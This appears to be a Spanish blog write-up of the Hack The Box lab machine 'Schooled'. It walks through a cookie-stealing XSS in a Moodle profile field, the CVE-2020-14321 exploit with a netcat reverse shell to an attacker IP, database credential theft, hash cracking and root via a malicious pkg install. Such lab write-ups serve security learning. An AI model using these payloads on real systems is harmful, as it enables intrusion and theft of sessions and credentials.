---
layout: post
title: HTB_Schooled
date: 2023/07/10
slug: HTB_Schooled
heroImage: /assets/machines.jpg
---

# Schooled {-}

## Introduccion {-}

La maquina del dia se llama Schooled.

El replay del live se puede ver aqui

[![S4vitaar Schooled maquina](https://img.youtube.com/vi/gsz_aK-r_8s/0.jpg)](https://www.youtube.com/watch?v=gsz_aK-r_8s)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.234
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.234
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.234 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,443 10.10.10.234 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | http     | Web, Fuzzing       |            |
| 33060  | mysql?   | SQLI               |            |

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.234
```

Es un Apache 2.4.46 en un **FreeBSD** con PHP 7.4.15. Vemos un email 
```bash
 admission@schooled.htb 
```
, añadmimos el dominio al 
```bash
 /etc/hosts 
```
.


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.234 
```
 o 
```bash
 http://schooled.htb 
```
 vemos lo mismo. El wappalizer no nos muestra nada interessante.
No vemos commentarios interessante en el codigo fuente. Si pinchamos al link **About**, vemos que la pagina se carga con una animacion.
Investigamos lo que ocure al lado del servidor con **BurpSuite** pero no vemos nada.
En la pagina 
```bash
 http://10.10.10.234/about.html 
```
 vemos probables usuarios en el testimonials. En la pagina 
```bash
 http://10.10.10.234/teachers.html 
```
 
vemos mas usuarios potenciales. Decidimos crear un diccionario con estos usuarios por si acaso.

```bash
vi users

James Fernando
j.fernando
jfernando
Jacques Philips
j.philips
jphilips
Venanda Mercy
v.mercy
vmercy
Jane Higgins
j.higgins
jhiggins
Lianne Carter
l.carter
lcarter
Manuel Phillips
m.phillips
mphillips
Jamie Borham
j.borham
jborham
```

#### Fuzzing {-}

```bash
nmap --script http-enum -p80 10.10.10.234 -oN webScan
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.234/FUZZ
```

Como no encontramos nada interessante, vamos a enumerar subdominios con **WFUZZ**

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.shooled.htb http:10.10.10.234
wfuzz -c -t 200 --hc=404 --hl=461 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.shooled.htb http:10.10.10.234
```

Encontramos un subdominio 
```bash
 moodle.schooled.htb 
```
, lo añadmimos al 
```bash
 /etc/hosts 
```
.




## Vulnerability Assessment {-}


### Moodle {-}

Por la url 
```bash
 http://moodle.schooled.htb 
```
 vemos usuarios que ya tenemos en nuestro diccionario. Vemos que para ver los recursos, nos tenemos que
loggear. Hay la posibilidad de loggearnos como guest o de crear un nuevo usuario. 

Empezamos por crear un usuario. Vemos durante esta fase que necessitamos un email de typo 
```bash
 @student.schooled.htb 
```
, lo añadmimos en el 
```bash
 /etc/hosts 
```
.
pero la web por 
```bash
 http://student.schooled.htb 
```
 no cambia.

Vemos que estamos registrados como estudiante y tenemos acceso al curso **Mathematics**. Le damos al boton **enroll** para suscribirnos al curso.
Encontramos mensajes de profesores que nos dice que tenemos que tener el profile de MoodelNet para podernos suscribir al curso. 
Si vamos en nuestro perfil de usuario vemos que hay un campo MoodleNet profile. Nos llama la atencion el echo que el profe dice en el mensaje que
va a controlar todos los perfiles moodleNet antes que la classe empieze.

Miramos si hay una posibilidad de injectar un XSS en el campo MoodleNet Profile

### XSS {-}

```bash
<script>alert("XSS")</script>
```

Le damos a Update profile y vemos que una popup se pone visible. Como vemos que es vulnerable, vamos a intentar robar la cookie de session de Manuel Phillips.

1. Montamos un servidor web con python

    ```bash
    python3 -m http.server 80
    ```

1. Injectamos el XSS en la web

    ```html+
    <script>document.location="http://10.10.16.3/value_cookie=" + document.cookie</script>
    ```

1. Le damos a Update Profile.

Esperamos un poco y vemos que una peticion a sido lanzada y vemos una cookie de session 


![Schooled-moodleet-xss](/assets/images/Schooled-moodlenet-xss.png) 
Cambiamos la cookie desde firefox y recargamos la pagina. Ya vemos que nos hemos convertido en Manuel Philips.
Buscando por internet con busquedas de typo 
```bash
 moodle professor role rce github 
```
, vemos que existe un CVE 2020-14321.

Encontramos un exploit y lo utilizamos para crear una reverse shell.
## Vuln exploit & Gaining Access {-}

### Ganando accesso con moodle siendo professor {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Cargamos y lanzamos el exploit

    ```bash
    git clone https://github.com/lanzt/CVE-2020-14321
    cd CVE-2020-14321
    python3 CVE-2020-14321_RCE.py --cookie v6tp73g3lnflt81rvtn29jivj6 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f" http://moodle.schooled.htb/moodle
    ```

Y ganamos accesso al systema como el usuario **www**. No podemos lanzar una pseudo consola con tratamiento de la TTY pero seguimos investigando.

### User pivoting {-}

```bash
cd ..
ls
pwd
cd /usr/local/www/apache24/data/moodle
ls -l
cat config.php
```

Vemos un 
```bash
 config.php 
```
 con credenciales para mysql. 

```bash
which mysql
which mysqlshow
export $PATH
```

Aqui vemos que el PATH es muy pequeño. Copiamos nuestro PATH de la maquina de atacante y la ponemos en la victima

```bash
export PATH=/root/.local/bin:/home/s4vitar/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/go/bin/:/home/s4vitar/go-workspace/bin:/home/s4vitar/.fzf/bin
export $PATH
which mysqlshow
```

Ahora que tenemos acceso a la utilidad mysqlshow. Nos conectamos con las credenciales.

```bash
mysqlshow -umoodle -pPlaybookMaster2020
mysqlshow -umoodle -pPlaybookMaster2020 moodle
```

Vemos una table **mdl_user**, miramos su contenido con mysql

```bash
mysql -umoodle -pPlaybookMaster2020 -e "select * from mdl_user" moodle
mysql -umoodle -pPlaybookMaster2020 -e "select username,password,email from mdl_user" moodle
```

Copiamos el resultado en un fichero hashes y tratamos el fichero para poder crackearlo con John

#### Crackeando contraseñas con John {-}

```bash
cat hashes | awk '{print $1 ":" $2}'
cat hashes | awk '{print $1 ":" $2}' | sponge hashes
john --wordlist=/usr/share/wordlists/rockyout.txt hashes
```

Encontramos el hash del usuario admin. Pero este usuario no existe en el systema. Mirando el email vemos que el usuario es **jamie**

```bash
ssh jamie@10.10.10.234
```

Ya somos jamie y poder leer el user.txt## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
uname -a
cat /etc/os-release
sudo -l
```

Aqui vemos que podemos lanzar el binario 
```bash
 /usr/sbin/pkg install * 
```
 como cualquier usuario sin proporcionar contraseña.
Buscando por [gtfobins](https://gtfobins.github.io/gtfobins/pkg/#sudo) vemos que podemos convertirnos en root con el comando

```bash
TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF

sudo pkg install -y --no-repo-update ./x-1.0.txz
```

En este caso no funcciona porque la maquina victima no tiene **fpm** instalado. Vemos que este comando solo crea un 
```bash
 .txz 
```
. Lo hacemos desde nuestra maquina
de atacante

```bash
gem install fpm
cd /tmp
mkdir privesc
cd privesc

TF="/tmp/privesc"
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
```

Aqui ya tenemos el 
```bash
 .txz 
```
 en nuestra maquina de atacante. Lo transferimos a la maquina victima

1. Desde la maquina de atacante

    ```bash
    nc -nlvp 443 < x-1.0.txz
    ```

1. Desde la maquina victima

    ```bash
    nc 10.10.16.3 443 > x-1.0.txz
    ```

Ya podemos lanzar la instalacion.

```bash
sudo pkg install -y --no-repo-update ./x-1.0.txz
bash -p
whoami
#Output
root
```

Ya estamos root y podemos leer la flag.
